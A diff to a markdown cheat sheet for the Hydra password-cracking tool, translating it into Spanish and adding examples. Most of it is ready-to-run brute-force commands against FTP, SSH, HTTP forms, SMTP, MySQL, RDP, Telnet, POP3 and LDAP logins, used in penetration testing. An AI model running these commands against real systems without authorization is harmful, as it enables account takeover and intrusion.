@@ -1,43 +1,41 @@
 # Hydra
 
-Hydra is a powerful tool for password cracking. Here's a comprehensive guide on its usage:
+Hydra es una herramienta poderosa para la craqueo de contraseñas. Aquí tienes una guía completa sobre su uso:
 
-## Basic Syntax
+## Sintaxis Básica
 
 ```ruby
-hydra -l/-L <user/list> -p/-P <password/dictionary> <IP address> <protocol>
+hydra -l/-L <usuario/lista> -p/-P <contraseña/diccionario> <dirección IP> <protocolo>
 ```
 
-## Key Parameters
+## Parámetros Clave
 
-- `-l`: Specify a single username
-- `-L`: Use a list of usernames
-- `-p`: Specify a single password
-- `-P`: Use a password dictionary
-- `-s`: Specify a port number
-- `-o`: Save attack results to a file
+- `-l`: Especificar un único nombre de usuario
+- `-L`: Usar una lista de nombres de usuario
+- `-p`: Especificar una única contraseña
+- `-P`: Usar un diccionario de contraseñas
+- `-s`: Especificar un número de puerto
+- `-o`: Guardar los resultados del ataque en un archivo
 
+## Opciones Avanzadas
 
-## Advanced Options
+- `-t`: Establecer el número de conexiones paralelas por objetivo
+- `-w`: Tiempo de espera entre conexiones
+- `-f`: Detener el ataque después de encontrar el primer par usuario/contraseña válido
+- `-v`: Modo detallado, muestra usuario+contraseña para cada intento
 
-- `-t`: Set number of parallel connections per target
-- `-w`: Wait time between connections
-- `-f`: Stop attack after first found login/password pair
-- `-v`: Verbose mode, show login+pass for each attempt
+## Ejemplos
 
-
-## Examples
-
-### FTP brute Force
+### Fuerza Bruta en FTP
 
 ```ruby
-hydra -L users.txt -P passwords.txt 192.168.1.100 ftp
+hydra -L usuarios.txt -P contraseñas.txt 192.168.1.100 ftp
 ```
 
-### SSH with Specific Port
+### SSH con Puerto Específico
 
 ```ruby
-hydra -l root -P common_passwords.txt 10.0.0.1 ssh -s 2222
+hydra -l root -P contraseñas_comunes.txt 10.0.0.1 ssh -s 2222
 ```
 
 ### HTTP PostForm
@@ -45,8 +43,45 @@ hydra -l root -P common_passwords.txt 10.0.0.1 ssh -s 2222
 ```ruby
 hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
 ```
-### SMTP with Result Output
+
+### SMTP con Salida de Resultados
 
 ```ruby
-hydra -L users.txt -P passwords.txt smtp://10.0.0.1 -o smtp_results.txt
+hydra -L usuarios.txt -P contraseñas.txt smtp://10.0.0.1 -o resultados_smtp.txt
+```
+
+### Ataque a MySQL
+
+```ruby
+hydra -L usuarios_mysql.txt -P contraseñas_mysql.txt 192.168.1.200 mysql
+```
+
+### Autenticación RDP (Escritorio Remoto)
+
+```ruby
+hydra -L usuarios_rdp.txt -P contraseñas_rdp.txt 192.168.1.150 rdp
+```
+
+### Autenticación Telnet
+
+```ruby
+hydra -l admin -P contraseñas_telnet.txt 192.168.1.50 telnet
+```
+
+### HTTP GET con Autenticación Básica
+
+```ruby
+hydra -L usuarios_http.txt -P contraseñas_http.txt 192.168.1.20 http-get /admin
+```
+
+### Ataque a POP3
+
+```ruby
+hydra -L usuarios_pop3.txt -P contraseñas_pop3.txt 192.168.1.30 pop3
+```
+
+### Autenticación LDAP
+
+```ruby
+hydra -L usuarios_ldap.txt -P contraseñas_ldap.txt ldap://192.168.1.40
 ```
